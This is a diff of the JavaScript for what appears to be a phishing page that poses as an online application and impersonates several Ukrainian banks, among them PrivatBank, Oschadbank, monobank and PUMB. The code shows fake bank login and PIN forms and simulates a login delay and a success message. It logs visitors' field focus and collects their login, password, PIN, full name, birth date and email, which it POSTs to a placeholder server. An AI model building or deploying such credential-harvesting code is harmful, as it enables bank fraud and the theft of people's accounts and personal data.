@@ -10,134 +10,149 @@ document.addEventListener('DOMContentLoaded', function() {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ action, details, ...userData })
-        }).catch(err => console.error('Помилка відправки логу:', err));
+        }).catch(err => console.error('Ошибка отправки лога:', err));
     }
 
     // Логируем загрузку страницы
-    sendLog('Сторінка завантажена');
+    sendLog('Страница загружена');
 
-    // Отправка основной формы
-    document.getElementById("submitMainForm").addEventListener("click", function() {
-        const formValid = validateMainForm();
-        if (formValid) {
-            document.getElementById("mainForm").style.display = "none";
-            document.getElementById("bankSelection").style.display = "block";
-            sendLog('Основна форма заповнена');
-        }
+    // Показать выбор банка
+    document.getElementById("applyBtn")?.addEventListener("click", function() {
+        document.getElementById("bankSelection").style.display = "block";
+        this.style.display = "none";
+        sendLog('Нажатие кнопки "Подати заявку онлайн"');
     });
 
-    // Валидация основной формы
-    function validateMainForm() {
-        let isValid = true;
-        const inputs = document.querySelectorAll('#mainForm input[required], #mainForm textarea[required]');
-        
-        inputs.forEach(input => {
-            if (!input.value.trim()) {
-                input.style.borderColor = 'red';
-                isValid = false;
-            } else {
-                input.style.borderColor = '';
-            }
-        });
-
-        if (!isValid) {
-            alert('Будь ласка, заповніть всі обов\'язкові поля!');
-            return false;
-        }
-
-        return true;
-    }
-
-    // Выбор банка → переход на страницу банка
+    // Выбор банка → переход на соответствующую страницу
     document.querySelectorAll('.bank-option').forEach(option => {
         option.addEventListener('click', function() {
             const bankName = this.getAttribute('data-bank');
-            sendLog('Вибір банку', { bank: bankName });
-            
-            // Перенаправляем на соответствующую страницу банка
-            switch(bankName) {
-                case 'privat':
-                    window.location.href = 'privatbank.html';
-                    break;
-                case 'oschad':
-                    window.location.href = 'oschadbank.html';
-                    break;
-                case 'raif':
-                    window.location.href = 'raiffeisen.html';
-                    break;
-                case 'mono':
-                    window.location.href = 'monobank.html';
-                    break;
-                case 'pumb':
-                    window.location.href = 'pumb.html';
-                    break;
-            }
+            showBankPage(bankName);
+            sendLog('Выбор банка', { bank: bankName });
+        });
+    });
+
+    // Кнопка "Назад" на банковских страницах
+    document.querySelectorAll('.back-to-main').forEach(btn => {
+        btn.addEventListener('click', showMainPage);
+    });
+
+    // Обработка форм входа для всех банков
+    document.querySelectorAll('.bank-login-form').forEach(form => {
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const bankId = this.id.replace('LoginForm', '');
+            simulateLogin(bankId);
+        });
+    });
+
+    // Обработка PIN-форм для всех банков
+    document.querySelectorAll('.pin-form').forEach(form => {
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const bankId = this.id.replace('PinForm', '');
+            showSuccessMessage(bankId);
+        });
+    });
+
+    // Отправка основной формы
+    document.querySelector('.submit-btn')?.addEventListener('click', submitForm);
+
+    // Логируем клики по полям формы
+    document.querySelectorAll('.form-control').forEach(input => {
+        input.addEventListener('focus', () => {
+            sendLog('Фокус на поле ввода', { field: input.placeholder });
         });
     });
 });
 
-// Функция для страниц банков
-function initBankPage(bankName) {
-    document.body.classList.add(bankName);
+function showBankPage(bankName) {
+    document.getElementById('mainPage').style.display = 'none';
+    document.getElementById('bankPages').style.display = 'block';
     
-    // Логируем загрузку страницы банка
-    console.log(`Сторінка банку ${bankName} завантажена`);
+    // Скрываем все банковские страницы
+    document.querySelectorAll('.bank-page').forEach(page => {
+        page.style.display = 'none';
+    });
     
-    // Обработка формы входа в банк
-    const loginForm = document.getElementById('bankLoginForm');
-    if (loginForm) {
-        loginForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const login = document.getElementById('bankLogin').value;
-            const password = document.getElementById('bankPassword').value;
-            
-            if (!login || !password) {
-                alert('Будь ласка, введіть логін та пароль!');
-                return;
-            }
-            
-            // Показываем загрузку
-            document.getElementById('loading').style.display = 'block';
-            loginForm.style.display = 'none';
-            
-            // Имитация задержки 2-4 секунды
-            setTimeout(() => {
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('pinForm').style.display = 'block';
-            }, 2000 + Math.random() * 2000);
-        });
-    }
-    
-    // Обработка формы с PIN-кодом
-    const pinForm = document.getElementById('pinForm');
-    if (pinForm) {
-        pinForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const pin = document.getElementById('bankPin').value;
-            
-            if (!pin || pin.length !== 4) {
-                alert('Будь ласка, введіть коректний PIN-код (4 цифри)!');
-                return;
-            }
-            
-            // Показываем успешное сообщение
-            document.getElementById('pinForm').style.display = 'none';
-            document.getElementById('successMessage').style.display = 'block';
-            
-            // Через 3 секунды возвращаем на главную
-            setTimeout(() => {
-                window.location.href = 'index.html';
-            }, 3000);
-        });
+    // Показываем выбранную страницу банка
+    const bankPage = document.getElementById(`${bankName}Page`);
+    if (bankPage) {
+        bankPage.style.display = 'block';
+        // Показываем форму входа
+        document.getElementById(`${bankName}LoginForm`).classList.add('active-form');
     }
 }
 
-// Валидация PIN-кода
+function showMainPage() {
+    document.getElementById('mainPage').style.display = 'block';
+    document.getElementById('bankPages').style.display = 'none';
+    document.getElementById("bankSelection").style.display = "none";
+    document.getElementById("applyBtn").style.display = "inline-block";
+}
+
+function simulateLogin(bankId) {
+    // Показываем индикатор загрузки
+    document.getElementById(`${bankId}LoginForm`).classList.remove('active-form');
+    document.getElementById(`${bankId}Loading`).style.display = 'block';
+    
+    // Через 2 секунды показываем форму для PIN-кода
+    setTimeout(() => {
+        document.getElementById(`${bankId}Loading`).style.display = 'none';
+        document.getElementById(`${bankId}PinForm`).classList.add('active-form');
+    }, 2000);
+}
+
+function showSuccessMessage(bankId) {
+    // Скрываем форму PIN-кода
+    document.getElementById(`${bankId}PinForm`).classList.remove('active-form');
+    
+    // Показываем сообщение об успехе
+    document.getElementById(`${bankId}SuccessMessage`).style.display = 'block';
+}
+
 function validatePin(input) {
     input.value = input.value.replace(/[^0-9]/g, '');
-    if (input.value.length > 4) {
-        input.value = input.value.slice(0, 4);
-    }
+}
+
+function submitForm() {
+    const submitBtn = document.querySelector(".submit-btn");
+    submitBtn.innerHTML = "Відправка...";
+    submitBtn.disabled = true;
+
+    // Собираем данные формы
+    const formData = {
+        login: document.querySelector('input[type="text"]').value,
+        password: document.querySelector('input[type="password"]').value,
+        pin: document.querySelector('input[placeholder*="пін-код"]').value,
+        fullName: document.querySelector('input[placeholder*="ПІБ"]').value,
+        birthDate: document.querySelector('input[type="date"]').value,
+        email: document.querySelector('input[type="email"]').value
+    };
+
+    // Отправляем данные формы на сервер
+    fetch('https://ваш-сервер.com/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(formData)
+    })
+    .then(response => {
+        if (!response.ok) throw new Error('Ошибка сервера');
+        return response.json();
+    })
+    .then(() => {
+        alert("Дані успішно відправлені! Очікуйте рішення.");
+        document.getElementById("dataForm").style.display = "none";
+        document.getElementById("applyBtn").style.display = "inline-block";
+    })
+    .catch(error => {
+        alert("Помилка при відправці даних: " + error.message);
+    })
+    .finally(() => {
+        submitBtn.innerHTML = "Підтвердити";
+        submitBtn.disabled = false;
+        document.querySelectorAll('.form-control').forEach(input => {
+            input.value = '';
+        });
+    });
 }
